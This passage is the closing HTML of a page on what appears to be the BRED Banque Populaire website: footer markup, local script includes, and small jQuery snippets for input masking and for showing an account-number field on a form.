<li class="pre-post-footer__item"><span class="social-network__link obflink" title="LinkedIn" data-link="https://www.linkedin.com/company/bred-banque-populaire/" target="_blank"><img src="../../medias/images/icones/ico-social-linkedin.png" alt="LinkedIn" /></span></li>
</ul>
</div>
</div>
</div>
</section> <!-- /.section-pre-post-footer -->
    <section class="section-dark bg-color-black color-white" id="copyright_footer">
<div class="container">
<div class="row">
<div class="col-md-12 text-center">
<p>© BRED Banque Populaire 2020</p>
<p></p>
</div>
</div>
</div>
</section>
    <!-- .section-post-footer -->
    <section class="section section-post-footer"><!-- SECTION -->
      <div class="container">
        <div class="row"><!-- LIGNE -->
          <img src="/bredfr/++theme++bredfr/assets/images/logo-bred.svg" alt="Logo Bred" class="section-post-footer__logo wow fadeInUp" />
        </div>
      </div>
    </section><!-- /.section-post-footer -->

        <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/imagesloaded.pkgd.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.enllax.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/bootstrap.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.cookie.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.cookiesdirective.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/underscore.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/wow.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/slick.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/idangerous.swiper.js"></script>
    <!-- date picker -->
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.ui.datepicker.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/scripts/main.min.js"></script>
    <!-- documentation: https://igorescobar.github.io/jQuery-Mask-Plugin/docs.html -->
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.mask.min.js"></script>
    <script class="anonymous_scripts">
      (function ($) {
        $('.letters-only').mask('i', {
          'translation': {
            i: {pattern: /[A-Za-z &#224;&#232;&#236;&#242;&#249;&#192;&#200;&#204;&#210;&#217;&#225;&#233;&#237;&#243;&#250;&#253;&#193;&#201;&#205;&#211;&#218;&#221;&#226;&#234;&#238;&#244;&#251;&#194;&#202;&#206;&#212;&#219;&#227;&#241;&#245;&#195;&#209;&#213;&#228;&#235;&#239;&#246;&#252;&#255;&#196;&#203;&#207;&#214;&#220;&#376;&#231;&#199;&#223;&#216;&#248;&#197;&#229;&#198;&#230;&#339;]/, recursive: true}
          }
        });
        $('.numbers-only').mask('i', {
          'translation': {
            i: {pattern: /[0-9]/, recursive: true}
          }
        });
      }(jQuery));
    </script>

    <!-- conditional form element-->
    <script class="anonymous_scripts">
      (function ($) {
        var $field = $('#accountNumber');
        var $radios = $('input[type=radio][name="fcbred"]');
        var $triggerOn = $('#fcbred0');
        $radios.on('change', function () {
          if ($triggerOn.prop('checked') === true) {
            $field.show();
          } else {
            $field.hide();
          }
        });
      }(jQuery));
    </script>

    <!-- documentation: https://jqueryvalidation.org/ -->
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.validate.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/additional-methods.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/messages_fr.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/js/deployJava.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/js/ypsidplone.js"></script>

    
  </div><!-- /.page --><div id="technical_area">
     <!-- zone pour des ajouts locaux de balises -->
  </div><div id="scrollUp"><a href="#top"><img src="/bredfr/++theme++bredfr/assets/images/ico_to_top.png" /></a></div></body>

</html>